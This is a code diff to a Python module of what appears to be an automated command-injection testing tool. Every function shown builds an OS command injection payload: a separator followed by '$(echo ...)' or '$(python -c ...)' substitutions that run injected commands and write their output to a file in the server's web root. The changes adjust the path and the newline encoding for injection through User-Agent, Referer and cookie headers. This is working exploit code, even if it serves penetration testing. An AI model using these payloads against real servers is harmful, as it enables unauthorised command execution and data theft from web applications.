@@ -26,7 +26,7 @@ from src.utils import settings
 def decision(separator, TAG, OUTPUT_TEXTFILE):
 
   payload = (separator + " " +
-            "$(echo " + TAG + "" + " > " + OUTPUT_TEXTFILE + ")"
+            "$(echo " + TAG + "" + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + ")"
             ) 
 
   return payload
@@ -37,11 +37,13 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 
   payload = (separator + " " + 
-            "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")"
+            "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")"
              ) 
 
-  if settings.COOKIE_INJECTION == True:
-    payload = payload.replace("\n","%0a")
+  if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
+    payload = payload.replace("\n", separator)
+  else:
+    payload = payload.replace("\n","%0d")
 
   return payload
 
@@ -51,7 +53,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
   
   payload = (separator +
-             "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
+             "echo $(" + cmd + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + ")" 
             )
 
   return payload
@@ -62,8 +64,13 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
   
   payload = (separator + 
-            "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
+            "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
             )
-  if settings.COOKIE_INJECTION == True:
-    payload = payload.replace("\n","%0a")
+
+  # New line fixation
+  if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
+    payload = payload.replace("\n", separator)
+  else:
+    payload = payload.replace("\n","%0d")
+
   return payload
